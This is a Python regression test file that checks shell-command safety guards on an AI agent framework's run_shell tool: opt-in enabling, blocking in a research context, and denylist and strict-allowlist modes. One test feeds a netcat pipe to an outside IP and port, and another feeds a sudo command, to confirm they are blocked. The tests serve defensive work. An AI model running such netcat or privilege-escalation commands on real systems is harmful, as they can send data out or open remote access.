"""Regression tests for H-S3 (shell command safety hardening)."""

from __future__ import annotations

import asyncio

import pytest

from forven.agents import tool_registry
from forven.agents import tools_core
from forven.agents.context import reset_tool_context, set_tool_context


@pytest.fixture(autouse=True)
def _enable_shell_tool(monkeypatch):
    """The shell tool is disabled by default; these guard tests exercise the
    behavior that applies once an operator opts in via FORVEN_ENABLE_SHELL_TOOL."""
    monkeypatch.setenv("FORVEN_ENABLE_SHELL_TOOL", "1")


def _run(coro):
    return asyncio.get_event_loop().run_until_complete(coro) if False else asyncio.run(coro)


def test_run_shell_disabled_by_default(monkeypatch):
    """Without the explicit opt-in, run_shell refuses to execute anything."""
    monkeypatch.delenv("FORVEN_ENABLE_SHELL_TOOL", raising=False)
    out = asyncio.run(tools_core._tool_run_shell("echo hello"))
    assert "Blocked" in out
    assert "disabled by default" in out


def test_run_shell_is_denied_in_research_context(monkeypatch):
    """Untrusted research content cannot reach the opt-in shell primitive."""
    monkeypatch.setattr(tool_registry, "_load_toolset_overrides", lambda *_args: {})

    registered = tool_registry._REGISTRY["run_shell"]
    assert registered.category == "catastrophic"

    available = {
        tool["name"] for tool in tool_registry.get_tools_for_agent(None, context="research")
    }
    assert "run_shell" not in available

    tokens = set_tool_context(None, "T0001", tools_context="research")
    try:
        out = asyncio.run(tool_registry.execute_tool("run_shell", {"command": "echo hello"}))
    finally:
        reset_tool_context(tokens)

    assert out == (
        "Tool 'run_shell' (category 'catastrophic') is disabled "
        "in the 'research' context."
    )


def test_program_basename_strips_path_and_ext():
    assert tools_core._program_basename("/usr/bin/python3") == "python3"
    assert tools_core._program_basename("C:\\Windows\\System32\\cmd.exe") == "cmd"
    assert tools_core._program_basename("nc.exe") == "nc"
    assert tools_core._program_basename("") == ""


def test_scan_program_tokens_finds_pipeline_segments():
    progs = tools_core._scan_program_tokens("ls -la | grep foo | wc -l")
    assert progs == ["ls", "grep", "wc"]


def test_scan_program_tokens_handles_separators():
    progs = tools_core._scan_program_tokens("git status && echo done")
    assert progs == ["git", "echo"]


def test_run_shell_blocks_denylisted_program_in_pipeline(monkeypatch):
    """H-S3: nc deep in a pipeline is rejected even though substring would miss it."""
    monkeypatch.delenv("FORVEN_SHELL_STRICT_ALLOWLIST", raising=False)
    out = asyncio.run(tools_core._tool_run_shell("echo hi | nc 1.2.3.4 4444"))
    assert "Blocked" in out
    assert "nc" in out


def test_run_shell_blocks_sudo(monkeypatch):
    monkeypatch.delenv("FORVEN_SHELL_STRICT_ALLOWLIST", raising=False)
    out = asyncio.run(tools_core._tool_run_shell("sudo ls /root"))
    assert "Blocked" in out
    assert "sudo" in out


def test_run_shell_blocks_unix_head_on_windows(monkeypatch):
    monkeypatch.delenv("FORVEN_SHELL_STRICT_ALLOWLIST", raising=False)
    monkeypatch.setattr(tools_core.os, "name", "nt")
    out = asyncio.run(tools_core._tool_run_shell("dir /s /b *.py | head -20"))
    assert "Blocked" in out
    assert "head" in out
    assert "Select-Object" in out


def test_run_shell_strict_allowlist_blocks_unknown_program(monkeypatch):
    """H-S3 strict mode: unknown programs are rejected with helpful message."""
    monkeypatch.setenv("FORVEN_SHELL_STRICT_ALLOWLIST", "1")
    out = asyncio.run(tools_core._tool_run_shell("some-random-binary --help"))
    assert "Blocked" in out
    assert "strict" in out.lower()


def test_run_shell_strict_allowlist_permits_git(monkeypatch):
    """H-S3 strict mode: git is on the allowlist so it actually runs."""
    monkeypatch.setenv("FORVEN_SHELL_STRICT_ALLOWLIST", "1")
    # `git --version` is harmless and should pass the safety gate.
    # If git isn't installed in CI, the run errors out but the gate doesn't reject it.
    out = asyncio.run(tools_core._tool_run_shell("git --version"))
    assert "Blocked" not in out


def test_run_shell_default_mode_permits_arbitrary_program(monkeypatch):
    """Backward compat: default mode (allowlist OFF) lets non-denylisted programs run."""
    monkeypatch.delenv("FORVEN_SHELL_STRICT_ALLOWLIST", raising=False)
    out = asyncio.run(tools_core._tool_run_shell("echo hello"))
    assert "Blocked" not in out
    assert "hello" in out
